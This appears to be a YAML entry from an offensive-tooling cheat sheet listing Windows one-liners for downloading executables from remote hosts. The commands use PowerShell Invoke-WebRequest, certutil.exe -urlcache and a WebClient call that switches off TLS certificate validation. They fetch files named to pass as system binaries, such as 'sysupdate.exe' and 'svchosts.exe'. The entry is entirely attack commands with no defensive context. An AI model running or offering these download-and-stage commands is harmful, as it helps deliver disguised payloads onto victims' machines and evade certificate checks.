---
functions:
  file-transfer:
    - description: Download Files
      code: |
        powershell -c iwr -Uri http://192.168.1.1:8080/sysupdate.exe -usebasicparsing
        
        Invoke-Webrequest -Uri http://192.168.1.1:8080/sysupdate.exe -usebasicparsing
        
        certutil.exe -urlcache -f http://192.168.1.1:8080/get.exe get.exe

        powershell -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(New-Object System.Net.WebClient).DownloadFile('https://68.183.217.18:56789/svchosts.exe','svchosts.exe')"
resources: |

---
